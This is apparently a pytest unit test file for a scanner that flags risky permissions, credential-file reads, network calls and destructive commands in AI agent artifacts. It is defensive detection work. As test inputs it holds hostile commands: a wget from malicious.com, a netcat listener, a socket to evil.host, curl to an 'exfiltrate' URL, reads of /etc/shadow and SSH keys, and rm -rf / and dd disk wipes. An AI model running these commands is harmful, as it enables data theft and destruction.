"""Unit tests for the PermAudit scanner module."""

import pytest

from ai_artifact_risk_validator.models import (
    ArtifactType,
    ScannerModule,
)
from ai_artifact_risk_validator.scanners.perm_audit import PermAuditScanner


@pytest.fixture
def scanner() -> PermAuditScanner:
    """Create a PermAuditScanner instance for testing."""
    return PermAuditScanner()


class TestScannerMetadata:
    """Tests for scanner properties and metadata."""

    def test_name(self, scanner: PermAuditScanner) -> None:
        assert scanner.name == ScannerModule.PERM_AUDIT

    def test_applicable_artifact_types(self, scanner: PermAuditScanner) -> None:
        types = scanner.applicable_artifact_types
        expected = {
            ArtifactType.SKILL,
            ArtifactType.AGENT,
            ArtifactType.STEERING,
            ArtifactType.MCP,
            ArtifactType.HOOK,
            ArtifactType.INSTRUCTION,
            ArtifactType.PLUGIN,
            ArtifactType.MEMORY,
            ArtifactType.ORCHESTRATION,
            ArtifactType.API_SCHEMA,
        }
        assert set(types) == expected
        # NOT applicable to these types
        assert ArtifactType.PROMPT not in types
        assert ArtifactType.SOP not in types
        assert ArtifactType.RAG not in types
        assert ArtifactType.EVAL_HARNESS not in types

    def test_detected_risk_ids(self, scanner: PermAuditScanner) -> None:
        risk_ids = scanner.detected_risk_ids
        expected = [
            "SK-S1",
            "SK-S3",
            "SK-S6",
            "A-S1",
            "A-S2",
            "A-S6",
            "ST-S3",
            "ST-S4",
            "MCP-S7",
            "MCP-S10",
            "H-S3",
            "H-S6",
            "I-S4",
            "I-S5",
            "API-S2",
            "OW-S2",
            "M-S5",
            "PL-S2",
            "PL-S6",
        ]
        assert set(risk_ids) == set(expected)

    def test_is_available(self, scanner: PermAuditScanner) -> None:
        assert scanner.is_available() is True


class TestPermissionPolicyDetection:
    """Tests for permission/policy violation detection."""

    def test_detects_wildcard_permissions(self, scanner: PermAuditScanner) -> None:
        content = 'permissions: "*"'
        findings = scanner.scan(content, ArtifactType.SKILL, "my_skill.md")
        assert len(findings) >= 1
        assert any(f.id == "SK-S1" for f in findings)
        assert all(f.confidence >= 0.95 for f in findings if "Wildcard" in f.description)

    def test_detects_wildcard_in_array(self, scanner: PermAuditScanner) -> None:
        content = 'tools = ["*"]'
        findings = scanner.scan(content, ArtifactType.AGENT, "agent.md")
        assert len(findings) >= 1
        assert any(f.id == "A-S1" for f in findings)

    def test_detects_admin_role(self, scanner: PermAuditScanner) -> None:
        content = "role: admin"
        findings = scanner.scan(content, ArtifactType.MCP, "mcp.json")
        perm_findings = [f for f in findings if "Elevated" in f.description]
        assert len(perm_findings) >= 1
        assert any(f.id == "MCP-S7" for f in perm_findings)

    def test_detects_unrestricted_fs_access(self, scanner: PermAuditScanner) -> None:
        content = "filesystem_access: full"
        findings = scanner.scan(content, ArtifactType.PLUGIN, "plugin.json")
        assert len(findings) >= 1
        assert any(f.id == "PL-S2" for f in findings)

    def test_detects_unrestricted_command_execution(self, scanner: PermAuditScanner) -> None:
        content = "execute: any"
        findings = scanner.scan(content, ArtifactType.HOOK, "deploy.hook.yaml")
        assert len(findings) >= 1
        assert any(f.id == "H-S3" for f in findings)

    def test_detects_broad_write_access(self, scanner: PermAuditScanner) -> None:
        content = "write_access: /"
        findings = scanner.scan(content, ArtifactType.INSTRUCTION, "setup.instructions.md")
        assert len(findings) >= 1
        assert any(f.id == "I-S4" for f in findings)

    def test_policy_confidence_band(self, scanner: PermAuditScanner) -> None:
        content = 'permissions = "*"'
        findings = scanner.scan(content, ArtifactType.SKILL, "skill.md")
        policy_findings = [f for f in findings if "Wildcard" in f.description]
        # Policy violations should be in 0.95-1.0 band
        assert all(0.95 <= f.confidence <= 1.0 for f in policy_findings)


class TestSensitiveFilePathDetection:
    """Tests for sensitive file path access detection."""

    def test_detects_etc_passwd(self, scanner: PermAuditScanner) -> None:
        content = "Read the file at /etc/passwd for user info"
        findings = scanner.scan(content, ArtifactType.SKILL, "user_skill.md")
        assert len(findings) >= 1
        assert any(f.id == "SK-S3" for f in findings)
        assert any(f.confidence >= 0.95 for f in findings)

    def test_detects_etc_shadow(self, scanner: PermAuditScanner) -> None:
        content = "path: /etc/shadow"
        findings = scanner.scan(content, ArtifactType.AGENT, "agent.md")
        assert len(findings) >= 1

    def test_detects_ssh_directory(self, scanner: PermAuditScanner) -> None:
        content = "Read keys from ~/.ssh/"
        findings = scanner.scan(content, ArtifactType.MCP, "mcp.json")
        ssh_findings = [f for f in findings if "SSH" in f.description]
        assert len(ssh_findings) >= 1

    def test_detects_ssh_key_file(self, scanner: PermAuditScanner) -> None:
        content = "key_file: id_rsa"
        findings = scanner.scan(content, ArtifactType.HOOK, "deploy.hook.yaml")
        assert len(findings) >= 1
        assert any(f.id == "H-S3" for f in findings)

    def test_detects_credentials_file(self, scanner: PermAuditScanner) -> None:
        content = "Load secrets from .env"
        findings = scanner.scan(content, ArtifactType.INSTRUCTION, "setup.md")
        cred_findings = [f for f in findings if "Credentials" in f.description]
        assert len(cred_findings) >= 1

    def test_detects_aws_credentials(self, scanner: PermAuditScanner) -> None:
        content = "config_path: .aws/credentials"
        findings = scanner.scan(content, ArtifactType.PLUGIN, "aws_plugin.json")
        assert len(findings) >= 1

    def test_detects_wildcard_file_access(self, scanner: PermAuditScanner) -> None:
        content = "path: **/*"
        findings = scanner.scan(content, ArtifactType.MEMORY, "config.yaml")
        assert len(findings) >= 1
        assert any(f.id == "M-S5" for f in findings)

    def test_detects_docker_socket(self, scanner: PermAuditScanner) -> None:
        content = "volume: /var/run/docker.sock"
        findings = scanner.scan(content, ArtifactType.MCP, "docker-mcp.json")
        container_findings = [f for f in findings if "Container" in f.description]
        assert len(container_findings) >= 1

    def test_file_access_confidence_band(self, scanner: PermAuditScanner) -> None:
        content = "Read /etc/passwd"
        findings = scanner.scan(content, ArtifactType.SKILL, "skill.md")
        # Pattern-based detection should be in 0.80-0.94 or higher for known paths
        assert all(0.80 <= f.confidence <= 1.0 for f in findings)


class TestNetworkAccessDetection:
    """Tests for network access audit detection."""

    def test_detects_url_configuration(self, scanner: PermAuditScanner) -> None:
        content = "api_url: https://api.example.com/v1/data"
        findings = scanner.scan(content, ArtifactType.AGENT, "agent.md")
        net_findings = [f for f in findings if "URL" in f.description or "Network" in f.description]
        assert len(net_findings) >= 1
        assert any(f.id == "A-S2" for f in net_findings)

    def test_detects_curl_command(self, scanner: PermAuditScanner) -> None:
        content = "curl -X POST https://webhook.example.com/notify"
        findings = scanner.scan(content, ArtifactType.HOOK, "notify.hook.yaml")
        curl_findings = [f for f in findings if "curl" in f.description.lower()]
        assert len(curl_findings) >= 1

    def test_detects_wget_command(self, scanner: PermAuditScanner) -> None:
        content = "wget https://malicious.com/payload"
        findings = scanner.scan(content, ArtifactType.SKILL, "download_skill.md")
        assert len(findings) >= 1

    def test_detects_fetch_call(self, scanner: PermAuditScanner) -> None:
        content = "const result = await fetch(url)"
        findings = scanner.scan(content, ArtifactType.PLUGIN, "api_plugin.ts")
        http_findings = [f for f in findings if "HTTP" in f.description]
        assert len(http_findings) >= 1

    def test_detects_requests_library(self, scanner: PermAuditScanner) -> None:
        content = "response = requests.post(endpoint, data=payload)"
        findings = scanner.scan(content, ArtifactType.MCP, "api_mcp.py")
        assert len(findings) >= 1

    def test_detects_socket_connection(self, scanner: PermAuditScanner) -> None:
        content = "socket.connect(('evil.host', 4444))"
        findings = scanner.scan(content, ArtifactType.PLUGIN, "network_plugin.py")
        socket_findings = [f for f in findings if "Socket" in f.description]
        assert len(socket_findings) >= 1

    def test_detects_websocket(self, scanner: PermAuditScanner) -> None:
        content = "const ws = new WebSocket('wss://live.example.com')"
        findings = scanner.scan(content, ArtifactType.SKILL, "chat_skill.md")
        ws_findings = [f for f in findings if "WebSocket" in f.description]
        assert len(ws_findings) >= 1

    def test_detects_netcat(self, scanner: PermAuditScanner) -> None:
        content = "nc -lvp 4444"
        findings = scanner.scan(content, ArtifactType.HOOK, "backdoor.hook.yaml")
        net_cli_findings = [f for f in findings if "Network CLI" in f.description]
        assert len(net_cli_findings) >= 1

    def test_steering_network_uses_ST_S4(self, scanner: PermAuditScanner) -> None:
        content = "endpoint: https://external.api.com/data"
        findings = scanner.scan(content, ArtifactType.STEERING, "steering.md")
        net_findings = [f for f in findings if f.id == "ST-S4"]
        assert len(net_findings) >= 1

    def test_instruction_network_uses_I_S5(self, scanner: PermAuditScanner) -> None:
        content = "url = https://api.service.com/endpoint"
        findings = scanner.scan(content, ArtifactType.INSTRUCTION, "setup.instructions.md")
        net_findings = [f for f in findings if f.id == "I-S5"]
        assert len(net_findings) >= 1

    def test_network_confidence_band(self, scanner: PermAuditScanner) -> None:
        content = "curl https://example.com/data"
        findings = scanner.scan(content, ArtifactType.SKILL, "skill.md")
        # Pattern-based detection should be in 0.80-0.94 band
        assert all(0.80 <= f.confidence <= 1.0 for f in findings)


class TestDestructiveActionDetection:
    """Tests for destructive action detection."""

    def test_detects_rm_rf(self, scanner: PermAuditScanner) -> None:
        content = "rm -rf /tmp/build/*"
        findings = scanner.scan(content, ArtifactType.SKILL, "cleanup_skill.md")
        rm_findings = [
            f
            for f in findings
            if "rm" in f.description.lower() or "delete" in f.description.lower()
        ]
        assert len(rm_findings) >= 1
        assert any(f.id == "SK-S6" for f in rm_findings)
        assert any(f.confidence >= 0.95 for f in rm_findings)

    def test_detects_rm_force(self, scanner: PermAuditScanner) -> None:
        content = "rm -f important_file.db"
        findings = scanner.scan(content, ArtifactType.HOOK, "cleanup.hook.yaml")
        assert len(findings) >= 1
        assert any(f.id == "H-S6" for f in findings)

    def test_detects_format_command(self, scanner: PermAuditScanner) -> None:
        content = "mkfs.ext4 /dev/sda1"
        findings = scanner.scan(content, ArtifactType.AGENT, "disk_agent.md")
        format_findings = [f for f in findings if "format" in f.description.lower()]
        assert len(format_findings) >= 1
        assert any(f.id == "A-S6" for f in format_findings)

    def test_detects_drop_table(self, scanner: PermAuditScanner) -> None:
        content = "DROP TABLE users;"
        findings = scanner.scan(content, ArtifactType.MCP, "db_mcp.json")
        db_findings = [f for f in findings if "Database" in f.description]
        assert len(db_findings) >= 1
        assert any(f.id == "MCP-S10" for f in db_findings)

    def test_detects_truncate_table(self, scanner: PermAuditScanner) -> None:
        content = "TRUNCATE TABLE audit_log;"
        findings = scanner.scan(content, ArtifactType.PLUGIN, "db_plugin.py")
        assert len(findings) >= 1
        assert any(f.id == "PL-S6" for f in findings)

    def test_detects_shutdown(self, scanner: PermAuditScanner) -> None:
        content = "shutdown -h now"
        findings = scanner.scan(content, ArtifactType.ORCHESTRATION, "maintenance.yaml")
        system_findings = [
            f for f in findings if "system" in f.description.lower() or "Dangerous" in f.description
        ]
        assert len(system_findings) >= 1
        assert any(f.id == "OW-S2" for f in system_findings)

    def test_detects_killall(self, scanner: PermAuditScanner) -> None:
        content = "killall -9 node"
        findings = scanner.scan(content, ArtifactType.HOOK, "restart.hook.yaml")
        assert len(findings) >= 1

    def test_detects_chmod_777(self, scanner: PermAuditScanner) -> None:
        content = "chmod 777 /var/www/html"
        findings = scanner.scan(content, ArtifactType.SKILL, "setup_skill.md")
        perm_findings = [f for f in findings if "permission" in f.description.lower()]
        assert len(perm_findings) >= 1

    def test_detects_shutil_rmtree(self, scanner: PermAuditScanner) -> None:
        content = "shutil.rmtree(workspace_dir)"
        findings = scanner.scan(content, ArtifactType.MCP, "cleanup_mcp.py")
        code_findings = [f for f in findings if "Programmatic" in f.description]
        assert len(code_findings) >= 1

    def test_detects_os_remove(self, scanner: PermAuditScanner) -> None:
        content = "os.remove(config_file)"
        findings = scanner.scan(content, ArtifactType.PLUGIN, "cleanup_plugin.py")
        assert len(findings) >= 1

    def test_detects_dd_command(self, scanner: PermAuditScanner) -> None:
        content = "dd if=/dev/zero of=/dev/sda bs=1M"
        findings = scanner.scan(content, ArtifactType.AGENT, "disk_agent.md")
        dd_findings = [
            f for f in findings if "dd" in f.description.lower() or "Disk write" in f.description
        ]
        assert len(dd_findings) >= 1

    def test_destructive_confidence_band(self, scanner: PermAuditScanner) -> None:
        content = "rm -rf /"
        findings = scanner.scan(content, ArtifactType.SKILL, "skill.md")
        rm_findings = [f for f in findings if "rm" in f.evidence.lower()]
        # rm -rf should have very high confidence
        assert all(f.confidence >= 0.92 for f in rm_findings)


class TestArtifactTypeMapping:
    """Tests for correct risk ID assignment per artifact type."""

    def test_skill_destructive_uses_SK_S6(self, scanner: PermAuditScanner) -> None:
        content = "rm -rf /tmp/data"
        findings = scanner.scan(content, ArtifactType.SKILL, "skill.md")
        assert any(f.id == "SK-S6" for f in findings)

    def test_agent_destructive_uses_A_S6(self, scanner: PermAuditScanner) -> None:
        content = "rm -rf /tmp/data"
        findings = scanner.scan(content, ArtifactType.AGENT, "agent.md")
        assert any(f.id == "A-S6" for f in findings)

    def test_mcp_destructive_uses_MCP_S10(self, scanner: PermAuditScanner) -> None:
        content = "rm -rf /tmp/data"
        findings = scanner.scan(content, ArtifactType.MCP, "mcp.json")
        assert any(f.id == "MCP-S10" for f in findings)

    def test_hook_destructive_uses_H_S6(self, scanner: PermAuditScanner) -> None:
        content = "rm -rf /tmp/data"
        findings = scanner.scan(content, ArtifactType.HOOK, "hook.yaml")
        assert any(f.id == "H-S6" for f in findings)

    def test_plugin_destructive_uses_PL_S6(self, scanner: PermAuditScanner) -> None:
        content = "rm -rf /tmp/data"
        findings = scanner.scan(content, ArtifactType.PLUGIN, "plugin.ts")
        assert any(f.id == "PL-S6" for f in findings)

    def test_orchestration_destructive_uses_OW_S2(self, scanner: PermAuditScanner) -> None:
        content = "rm -rf /tmp/data"
        findings = scanner.scan(content, ArtifactType.ORCHESTRATION, "workflow.yaml")
        assert any(f.id == "OW-S2" for f in findings)

    def test_agent_network_uses_A_S2(self, scanner: PermAuditScanner) -> None:
        content = "api_url: https://api.example.com/data"
        findings = scanner.scan(content, ArtifactType.AGENT, "agent.md")
        assert any(f.id == "A-S2" for f in findings)

    def test_instruction_file_access_uses_I_S4(self, scanner: PermAuditScanner) -> None:
        content = "Read /etc/passwd for user list"
        findings = scanner.scan(content, ArtifactType.INSTRUCTION, "setup.md")
        assert any(f.id == "I-S4" for f in findings)


class TestEdgeCases:
    """Tests for edge cases and clean content."""

    def test_empty_content_returns_no_findings(self, scanner: PermAuditScanner) -> None:
        findings = scanner.scan("", ArtifactType.SKILL, "empty.md")
        assert findings == []

    def test_clean_content_returns_no_findings(self, scanner: PermAuditScanner) -> None:
        content = """# My Skill

This skill helps users write better documentation.

## Guidelines

- Be concise and accurate
- Follow best practices
- Explain your reasoning
"""
        findings = scanner.scan(content, ArtifactType.SKILL, "docs_skill.md")
        assert findings == []

    def test_finding_location_has_line_number(self, scanner: PermAuditScanner) -> None:
        content = "line1\nline2\nrm -rf /tmp/build\nline4"
        findings = scanner.scan(content, ArtifactType.SKILL, "skill.md")
        rm_findings = [f for f in findings if "rm" in f.evidence.lower()]
        assert rm_findings[0].location.line == 3

    def test_evidence_is_truncated(self, scanner: PermAuditScanner) -> None:
        # Very long evidence should be truncated
        content = "permissions: " + "*" * 100
        findings = scanner.scan(content, ArtifactType.SKILL, "skill.md")
        if findings:
            assert len(findings[0].evidence) <= 83  # 80 + "..."

    def test_scanner_module_set_correctly(self, scanner: PermAuditScanner) -> None:
        content = "rm -rf /tmp/data"
        findings = scanner.scan(content, ArtifactType.SKILL, "skill.md")
        assert all(f.scanner_module == ScannerModule.PERM_AUDIT for f in findings)

    def test_multiple_findings_from_different_categories(self, scanner: PermAuditScanner) -> None:
        content = """permissions: "*"
path: /etc/passwd
api_url: https://evil.com/data
rm -rf /var/log
"""
        findings = scanner.scan(content, ArtifactType.AGENT, "bad_agent.md")
        # Should have findings from all 4 categories
        assert len(findings) >= 4

    def test_finding_has_correct_artifact_path(self, scanner: PermAuditScanner) -> None:
        content = "rm -rf /tmp"
        findings = scanner.scan(content, ArtifactType.SKILL, "path/to/skill.md")
        assert all(f.artifact_path == "path/to/skill.md" for f in findings)

    def test_finding_has_correct_artifact_type(self, scanner: PermAuditScanner) -> None:
        content = "rm -rf /tmp"
        findings = scanner.scan(content, ArtifactType.MCP, "mcp.json")
        assert all(f.artifact_type == ArtifactType.MCP for f in findings)


class TestFalsePositiveFixes:
    """Regression tests for false-positive fixes in PermAuditScanner.

    Verifies that the tightened 'format' regex and the ORCHESTRATION URL
    suppression do not produce spurious findings for common patterns.
    """

    @pytest.fixture
    def scanner(self) -> PermAuditScanner:
        return PermAuditScanner()

    # --- Fix #2: format regex ---

    def test_python_logging_format_not_flagged(self, scanner: PermAuditScanner) -> None:
        """Python logging format= argument must not trigger 'Disk format command'."""
        content = 'logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")'
        findings = scanner.scan(content, ArtifactType.ORCHESTRATION, "app.py")
        disk_format = [f for f in findings if "Disk format" in f.description]
        assert len(disk_format) == 0

    def test_docstring_format_word_not_flagged(self, scanner: PermAuditScanner) -> None:
        """The word 'format' in a comment or docstring must not trigger a finding."""
        content = "# The file contains one path per line in the format:"
        findings = scanner.scan(content, ArtifactType.SKILL, "readme.md")
        disk_format = [f for f in findings if "Disk format" in f.description]
        assert len(disk_format) == 0

    def test_format_drive_letter_still_flagged(self, scanner: PermAuditScanner) -> None:
        """Windows 'format C:' must still be detected."""
        content = "format C: /FS:NTFS"
        findings = scanner.scan(content, ArtifactType.AGENT, "disk_agent.md")
        disk_format = [f for f in findings if "Disk format" in f.description]
        assert len(disk_format) >= 1

    def test_format_dev_path_still_flagged(self, scanner: PermAuditScanner) -> None:
        """Linux 'format /dev/sda' must still be detected."""
        content = "format /dev/sda"
        findings = scanner.scan(content, ArtifactType.AGENT, "disk_agent.md")
        disk_format = [f for f in findings if "Disk format" in f.description]
        assert len(disk_format) >= 1

    # --- Fix #5: ORCHESTRATION URL metadata ---

    def test_orchestration_metadata_url_not_flagged(self, scanner: PermAuditScanner) -> None:
        """A 'url: https://...' in orchestration YAML metadata must not be flagged."""
        content = "url: https://gitlab.example.com/group/project"
        findings = scanner.scan(content, ArtifactType.ORCHESTRATION, "catalog-entry.yaml")
        url_findings = [f for f in findings if "External URL" in f.description]
        assert len(url_findings) == 0

    def test_orchestration_curl_still_flagged(self, scanner: PermAuditScanner) -> None:
        """Active curl commands in orchestration artifacts must still be flagged."""
        content = "curl https://evil.example.com/exfiltrate"
        findings = scanner.scan(content, ArtifactType.ORCHESTRATION, "workflow.yaml")
        curl_findings = [f for f in findings if "curl" in f.description.lower()]
        assert len(curl_findings) >= 1
